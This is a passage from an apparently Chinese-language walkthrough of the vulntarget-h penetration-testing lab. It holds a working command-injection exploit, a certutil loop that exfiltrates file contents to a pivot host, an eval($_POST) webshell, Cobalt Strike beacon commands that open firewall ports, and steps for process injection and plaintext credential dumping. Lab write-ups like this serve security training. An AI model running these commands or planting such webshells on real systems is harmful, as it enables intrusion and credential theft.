02:33:39 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">+ Retrieved x-powered-by header: PHP/7.3.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">- STATUS: Completed 3190 requests (~46% complete, 16.6 minutes left): currently <span class="keyword">in</span> plugin <span class="string">&#x27;Nikto Tests&#x27;</span></span><br><span class="line">- STATUS: Running average: 100 requests: 0.22830 sec, 10 requests: 0.1804 sec.</span><br><span class="line">+ Scan terminated:  12 error(s) and 7 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-07-02 03:13:08 (GMT-4) (2369 seconds)</span><br></pre></td></tr></table></figure><h4 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h4><ul><li>使用浏览器查看网页是否有对我们有用的信息。(需要把火狐浏览器代理模式设置成系统代理)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 firefox 192.168.153.128</span><br></pre></td></tr></table></figure><p><img src="/../images/vulntarget-h%20write-up/%E6%88%AA%E5%9B%BE_2022-07-02_15-08-05.png" alt="截图_2022-07-02_15-08-05.png"></p><ul><li><p>从上面的返回的结果我们可以看到这是需要我们通过命令注入查看<code>c:\phpstudy_pro\COM\a.txt</code>文件的内容。由于这里使用<code>exec</code>函数并没有返回数据。</p></li><li><p>我们先尝试能不能在当前目录写入文件。发现并不可以。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128 -d <span class="string">&quot;shell=echo &#x27;&lt;?php phpinfo();?&gt;&#x27;&gt;l.php&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="built_in">exec</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#0000BB&quot;&gt;?&gt;&lt;/span&gt;小子留下了一个后门，读一下c:\phpstudy_pro\COM\a.txt吧里面有好东西</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;         </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128/l.php                                     </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;404 错误 - phpstudy&lt;/title&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li>接下来只能尝试使用<code>certutil</code>请求Windows Server 2008的开放的80端口（由于Windows 7不出网Windows Sever 2008刚好开放了80端口我们又有Windows Server 2008的权限，我们可以通过查看Windows Server 2008的IIS请求日志）。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128 -d <span class="string">&quot;shell=for /f %i in (&#x27;type c:\phpstudy_pro\COM\a.txt&#x27;) do certutil -urlcache  -split -f http://192.168.153.130/aaa/%i&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="built_in">exec</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#0000BB&quot;&gt;?&gt;&lt;/span&gt;小子留下了一个后门，读一下c:\phpstudy_pro\COM\a.txt吧里面有好东西</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure><ul><li>查看IIS请求日志（日志文件里面的数据可能会存在延迟）。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> C:\inetpub\logs\LogFiles\W3SVC1\</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> C:\inetpub\logs\LogFiles\W3SVC1\</span><br><span class="line">[+] host called home, sent: 67 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 DCD2-557A</span><br><span class="line"></span><br><span class="line"> C:\inetpub\logs\LogFiles\W3SVC1 的目录</span><br><span class="line"></span><br><span class="line">2022/07/02  12:48    &lt;DIR&gt;          .</span><br><span class="line">2022/07/02  12:48    &lt;DIR&gt;          ..</span><br><span class="line">2022/03/29  10:21               999 u_ex220329.log</span><br><span class="line">2022/07/02  18:10            16,728 u_ex220702.log</span><br><span class="line">               2 个文件         17,727 字节</span><br><span class="line">               2 个目录 24,780,013,568 可用字节</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">type</span> C:\inetpub\logs\LogFiles\W3SVC1\u_ex220702.log</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">type</span> C:\inetpub\logs\LogFiles\W3SVC1\u_ex220702.log</span><br><span class="line">[+] host called home, sent: 82 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"><span class="comment">#Software: Microsoft Internet Information Services 7.5</span></span><br><span class="line"><span class="comment">#Version: 1.0</span></span><br><span class="line"><span class="comment">#Date: 2022-07-02 04:48:37</span></span><br><span class="line"><span class="comment">#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken</span></span><br><span class="line">...</span><br><span class="line">2022-07-02 10:18:01 192.168.153.130 GET /aaa/dsuijaddjsfvos.php - 80 - 192.168.153.128 CertUtil+URL+Agent 404 0 64 15</span><br></pre></td></tr></table></figure><blockquote><p>上方教程参考于：<a href="https://cn-sec.com/archives/1129108.html">命令执行漏洞[无]回显[不]出网利用技巧</a></p></blockquote><ul><li><code>dsuijaddjsfvos.php</code>该就是<code>c:\phpstudy_pro\COM\a.txt</code>文件的内容。我们尝试使用<code>curl</code>访问一下<code>dsuijaddjsfvos.php</code>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128/dsuijaddjsfvos.php</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;<span class="built_in">eval</span>(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #DD0000&quot;</span>&gt;<span class="string">&#x27;shell&#x27;</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;col&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#0000BB&quot;&gt;?&gt;&lt;/span&gt;</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">==============================================================</span><br><span class="line"><span class="comment"># 通过浏览器访问得到的结果。</span></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><ul><li><p><code>dsuijaddjsfvos.php</code>该文件是一句话木马。接下来我们需要使用CS生成一个目录然后再进行免杀。</p></li><li><p>在生成木马之前我们需要创建一个监听器。</p></li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_07-10-45.png" alt="Screenshot_2022-07-02_07-10-45.png"></p><ul><li>你可以能会疑惑为什么需要把监听地址改为<strong>192.168.153.130</strong>。因为Windows Server 2008有两个网卡其中一个网卡是不能和Windows 7通信，<strong>192.168.153.130</strong>这个网卡是可以和Windows 7通信。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_07-11-12.png" alt="Screenshot_2022-07-02_07-11-12.png"></p><ul><li>由于我们这个反向连接需要在Windows Sever 2008开放4444端口否则会无法连接。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell netsh firewall <span class="built_in">set</span> portopening tcp 4444 <span class="built_in">enable</span></span><br><span class="line">[*] Tasked beacon to run: netsh firewall <span class="built_in">set</span> portopening tcp 4444 <span class="built_in">enable</span></span><br><span class="line">[+] host called home, sent: 77 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">重要信息: 已成功执行命令。</span><br><span class="line">但不赞成使用 <span class="string">&quot;netsh firewall&quot;</span>；</span><br><span class="line">而应该使用 <span class="string">&quot;netsh advfirewall firewall&quot;</span>。</span><br><span class="line">有关使用 <span class="string">&quot;netsh advfirewall firewall&quot;</span> 命令</span><br><span class="line">而非 <span class="string">&quot;netsh firewall&quot;</span> 的详细信息，请参阅</span><br><span class="line">http://go.microsoft.com/fwlink/?linkid=121488</span><br><span class="line">上的 KB 文章 947709。</span><br><span class="line"></span><br><span class="line">确定。</span><br></pre></td></tr></table></figure><ul><li><p>接下来我们就需要利用蚁剑把木马上传到Windows 7的<code>C:\phpstudy_pro\</code>目录然后再执行木马。（为什么不是上传到<code>WWW</code>目录，因为<code>C:\phpstudy_pro\</code>没有写入权限。）</p></li><li><p>使用蚁剑连接<code>dsuijaddjsfvos.php</code>文件的一句话木马。在连接一句话木马之前需要配置一下蚁剑的代理。</p></li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_06-59-12.png" alt="Screenshot_2022-07-02_06-59-12.png"></p><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_06-59-45.png" alt="Screenshot_2022-07-02_06-59-45.png"></p><ul><li>执行木马。这里你可以通过上图目录空白右击鼠标打开菜单找到打开终端选项运行木马。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-02-35.png" alt="Screenshot_2022-07-02_08-02-35.png"></p><ul><li><p>提升权限。</p></li><li><p>使用<code>systeminfo</code>命令并没有找到可以提升权限的漏洞。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell systeminfo</span><br><span class="line">[*] Tasked beacon to run: systeminfo</span><br><span class="line">[+] host called home, sent: 41 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">主机名:           WIN-HF4NQED9HKF</span><br><span class="line">OS 名称:          Microsoft Windows 7 企业版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00392-918-5000002-85557</span><br><span class="line">初始安装日期:     2022/3/30, 10:48:57</span><br><span class="line">系统启动时间:     2022/7/2, 13:07:54</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~3000 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~3000 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     2,047 MB</span><br><span class="line">可用的物理内存:   1,024 MB</span><br><span class="line">虚拟内存: 最大值: 4,095 MB</span><br><span class="line">虚拟内存: 可用:   3,008 MB</span><br><span class="line">虚拟内存: 使用中: 1,087 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       \\WIN-HF4NQED9HKF</span><br><span class="line">修补程序:         安装了 3 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB4474419</span><br><span class="line">                  [03]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接 2</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.153.128</span><br><span class="line">                        [02]: fe80::8f8:10d9:c4a9:f089</span><br></pre></td></tr></table></figure><ul><li>尝试进程注入，在注入之前需要找到可以注入的进程。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-12-47.png" alt="Screenshot_2022-07-02_08-12-47.png"></p><ul><li>在进程列表找到<strong>phpStudyServer.exe</strong>的进程，我们就尝试注入这个进程吧。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-16-41.png" alt="Screenshot_2022-07-02_08-16-41.png"></p><ul><li>成功注入<strong>phpStudyServer.exe</strong>进程。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-17-04.png" alt="Screenshot_2022-07-02_08-17-04.png"></p><ul><li>抓取明文密码。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-22-16.png" alt="Screenshot_2022-07-02_08-22-16.png"></p></blockquote><h3 id="Windws-10"><a href="#Windws-10" class="headerlink" title="Windws 10"></a>Windws 10</h3><blockquote><p>由于本文章头开已经知道Windows 10的IP地址这里我就越过扫描192.168.153.0&#x2F;24这个网段。</p></blockquote><h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><ul><li>使用CS端口扫描功能查看Windows 10开放的端口。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; portscan 192.168.153.129 1-1024,3389,5900-6000 none 1024</span><br><span class="line">[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 192.168.153.129</span><br><span class="line">[+] host called home, sent: 75389 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">192.168.153.128:445</span><br><span class="line">192.168.153.130:445 (platform: 500 version: 6.1 name: WIN-7DSM1JVE9PO domain: WORKGROUP)</span><br><span class="line">Scanner module is complete</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">192.168.153.129:80</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">Scanner module is complete</span><br></pre></td></tr></table></figure><ul><li>使用<code>nmap</code>扫描<strong>Windows 10</strong>的80端口是否存在漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 nmap -p80 192.168.153.129 --script=vuln</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 09:12 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.153.129</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 232.50 seconds</span></span><br></pre></td></tr></table></figure><ul><li>通过上面的返回结果我们可以发现<strong>cve2014-3704</strong>这个漏洞并不属于WordPress，接下来我们就使用<code>nikto</code>的看看能不能找到有用的信息。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 nikto -host http://192.168.153.129</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">...</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line">+ Target IP:          192.168.153.129</span><br><span class="line">+ Target Hostname:    192.168.153.129</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-07-02 09:22:10 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">+ Retrieved x-powered-by header: PHP/7.3.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header <span class="string">&#x27;link&#x27;</span> found, with contents: &lt;http://192.168.153.129/index.php/wp-json/&gt;; rel=<span class="string">&quot;https://api.w.org/&quot;</span></span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Uncommon header <span class="string">&#x27;x-redirect-by&#x27;</span> found, with contents: WordPress</span><br><span class="line">+ Entry <span class="string">&#x27;/wp-admin/&#x27;</span> <span class="keyword">in</span> robots.txt returned a non-forbidden or redirect HTTP code (302)</span><br><span class="line">+ <span class="string">&quot;robots.txt&quot;</span> contains 2 entries <span class="built_in">which</span> should be manually viewed.</span><br><span class="line">+ ERROR: Error <span class="built_in">limit</span> (20) reached <span class="keyword">for</span> host, giving up. Last error: error reading HTTP response</span><br><span class="line">+ ERROR: Error <span class="built_in">limit</span> (20) reached <span class="keyword">for</span> host, giving up. Last error: </span><br><span class="line">+ Scan terminated:  15 error(s) and 8 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-07-02 09:33:10 (GMT-4) (660 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><ul><li>通过上面的信息可以发现该网站是使用了<strong>WordPress</strong>，我们就可以使用<code>wpscan</code>来收集信息。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td 